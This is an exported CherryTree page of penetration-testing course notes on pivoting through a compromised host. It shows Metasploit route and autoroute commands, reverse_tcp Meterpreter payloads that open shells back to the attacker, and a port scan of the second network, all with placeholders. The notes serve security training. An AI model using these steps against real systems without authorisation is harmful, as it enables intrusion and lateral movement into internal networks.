<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Pivoting an Exploit trhough an existing meterpreter session</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Pivoting an Exploit trhough an existing meterpreter session</h1><br/><strong>Requirements:</strong><br />• Meterpreter session between attacker and pivot host<br /><br /><strong><h2>Pivoting an Exploit using Metasploit route command and a Meterpreter session</h2></strong><br />Metasploit <strong>route</strong> command, for pivoting attacks through already-established Meterpreter sessions.<br />When we have already exploited the Victim1 machine and we want to run an exploit for the Victim2 machine, we&#39;ll be pivoting our attack through Victim1<br /><br /><a href="file://G:/Other computers/Yoga 520/CherryTree/screenshots2/PTP-elearnsecurity/2. Network Security/6. Post Exploitation/pivotExploitMeterpreter.png"><img src="images/769-1.png" alt="images/769-1.png" /></a><br /><br /><strong><h3>Metasploit route command</h3></strong>(OPTION 1)<br />network command of metasploit<br /><div class="codebox"><pre>msf &gt; use [exploit1]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST [victim1]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> PAYLOAD windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf &gt; exploit<br />meterpreter &gt; <span style="color:#ff9d00;font-weight:700">(</span>CTRL-Z to background session… will display meterpreter sid<span style="color:#ff9d00;font-weight:700">)</span><br />msf &gt; route add [victim2_network] [netmask] [sid]<br />msf &gt; route print   <span style="color:#0088ff;font-weight:400">#to check if the route is been added; route -h give use other options</span><br />msf &gt; use [exploit2]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST [victim2]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> PAYLOAD windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf &gt; exploit</pre></div><br /><br /><strong>explanation of </strong><strong><code>route add [victim2_network] [netmask] [sid]  command</code></strong><br />   ◇ <strong><code>[victim2_network]</code></strong><strong> </strong>→  is the network where is victim2<br />   ◇ <code>netmask</code> → is a 32-bit &quot;mask&quot; used to define the subnet in the network (example: 255.255.225.0)<code><br /></code>   ◇ <code>sid</code> → meterpreter session running (in this case the sid is of the victim1 machine)<br />With this command we tell metasploit to route all the traffic intended to the network <code>victim2_network</code>/<code>netmask</code>, through the meterpreter session <code>sid</code>. <br />In other words, all the traffic to <code>victim2_network</code>/<code>netmask</code> will be tunneled through Victim 1<strong><br /><br /><br /></strong><strong><h3>Metasploit autoroute module</h3></strong><h3>(OPTION 2)</h3><br />use autoroute script from the meterpreter session<br /><br />• Pivot the entire traffic for a network<br />    <div class="codebox"><pre>meterpreter&gt; run autoroute <span style="color:#ff9d00;font-weight:700">-</span>s <span style="color:#333333;font-weight:400">10.32</span>.<span style="color:#333333;font-weight:400">121.0</span><span style="color:#ff9d00;font-weight:700">/</span><span style="color:#333333;font-weight:400">24</span><br />meterpreter&gt; background<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOSTS <span style="color:#333333;font-weight:400">10.32</span>.<span style="color:#333333;font-weight:400">121.23</span>                     <span style="color:#0088ff;font-weight:400">#all the traffic will be routed through autoroute</span><br />msf&gt; &gt; use auxiliary<span style="color:#ff9d00;font-weight:700">/</span>scanner<span style="color:#ff9d00;font-weight:700">/</span>portscan<span style="color:#ff9d00;font-weight:700">/</span>tcp</pre></div><br /><br /><br />• Pivot an exploit<br />    <div class="codebox"><pre>msf &gt; use [exploit1]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST [victim1]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> LHOST [AttackerIP]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> PAYLOAD windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf &gt; exploit<br />meterpreter&gt; background<br /></pre></div><br />    <div class="codebox"><pre>msf &gt; use post<span style="color:#ff9d00;font-weight:700">/</span>multi<span style="color:#ff9d00;font-weight:700">/</span>manage<span style="color:#ff9d00;font-weight:700">/</span>autoroute<br />msf &gt; <span style="color:#ff9d00;font-weight:700">info</span><br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> CMD add                                      <span style="color:#0088ff;font-weight:400">#If we use the default CMD option: autoadd , our other options will be ignored;</span><br />                                                       <span style="color:#0088ff;font-weight:400">#autoadd search the routing table in the victim1 machine and add the routes found</span><br />                                                       <span style="color:#0088ff;font-weight:400">#in the Metasploit&#39;s routing table</span><br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> SUBNET [victim2_network]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> NETMASK <span style="color:#ff9d00;font-weight:700">/</span>24                                  <span style="color:#0088ff;font-weight:400">#we can use both the notation &quot;255.255.255.0&quot; or &quot;/24&quot;</span><br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> SESSION [sid]                                <span style="color:#0088ff;font-weight:400">#meterpreter session that we got with the exploit 1</span><br />msf &gt; run<br />meterpreter &gt; autoroute -p                             <span style="color:#0088ff;font-weight:400">#to check if the route is been added</span><br />meterpreter &gt; background                               <span style="color:#0088ff;font-weight:400">#or CTRL-Z to background session… will display meterpreter sid</span><br />msf &gt; route print                                      <span style="color:#0088ff;font-weight:400">#to check if the route is been added</span><br />msf &gt; use [exploit2]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> RHOST [victim2]<br />msf &gt; <span style="color:#ff9d00;font-weight:700">set</span> PAYLOAD windows<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf &gt; exploit</pre></div><br /><br />Now we can use modules to scan ports of the victim2 machine:<br />    <a href=""><img src="images/769-2.png" alt="images/769-2.png" /></a><br /><br /><br /><span style="color:#ff1b00;">WARNING:</span><br />We do not have to confuse:<br />• Metasploit (msf) route command: used to direct all traffic for a given target subnet from the attacker&#39;s Metasploit machine through a given Meterpreter session on a compromised victim machine to another potential victim<br />• Meterpreter(meterpreter) route command: used to manage the routing tables on a target box that has been compromised using the Meterpreter payload<br /><br />Bibliography:<br /><br /></div>
</body>
</html>
